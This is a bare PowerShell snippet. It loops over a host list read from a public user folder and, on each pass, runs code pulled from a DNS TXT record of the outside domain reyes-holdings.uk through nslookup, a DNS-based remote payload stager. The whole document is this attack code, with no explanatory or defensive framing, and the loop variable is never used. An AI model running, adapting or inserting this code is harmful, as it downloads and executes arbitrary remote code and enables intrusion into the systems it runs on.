$rhosts = Get-Content -Path "C:\Users\Public\list.txt" 
foreach ($rhost in $rhosts)
{ 
   powershell .((nslookup -q=txt reyes-holdings.uk 8.8.8.8)[-1])
}